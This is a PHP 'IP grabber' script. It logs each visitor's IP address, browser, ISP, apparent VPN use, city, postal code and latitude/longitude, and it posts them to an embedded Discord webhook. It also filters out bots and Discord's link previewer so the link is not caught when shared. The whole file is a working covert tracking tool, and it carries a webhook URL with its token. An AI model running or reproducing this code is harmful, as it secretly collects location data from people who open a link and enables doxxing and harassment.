<?php
// Discord IP Grabber By ThatsFluke

// Discord WebHookURL
$webhookurl = "https://discordapp.com/api/webhooks/720190768698097734/PshY5Lz6tinyy6UOhQN3nsfEhaAZsLeLIjW2zXQpW05kHjBQIUFSaTQkvHJH3tg16cve";
$ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
            exit();
        }
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes";
        }else{
            $vpn = "No";
        }
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,hosting"));

$json_data = json_encode([
    // Message
    "content" => "**IP Address:** $ip
**ISP:** $details->isp
**Is it a VPN (May be innacurate):** $vpn
**Browser:** $browser
**Their time/date:** $TheirTime $TheirDate
**Region:** $details->region
**Country:** $details->country
**City:** $details->city
**Postal Code:** $details->zip
**Currency:** $details->currency
**Latitude:** $details->lat
**Longitude:** $details->lon
**IPGrabber by ThatsFluke.**",
    
    // Username
    "username" => "L33T H4CK3R",

    // Avatar URL.
    "avatar_url" => "https://rlv.zcache.com/anonymous_mask_classic_round_sticker-r1f44743090f54cd995cf1a560de89582_0ugmp_8byvr_704.jpg",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

   
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
?>
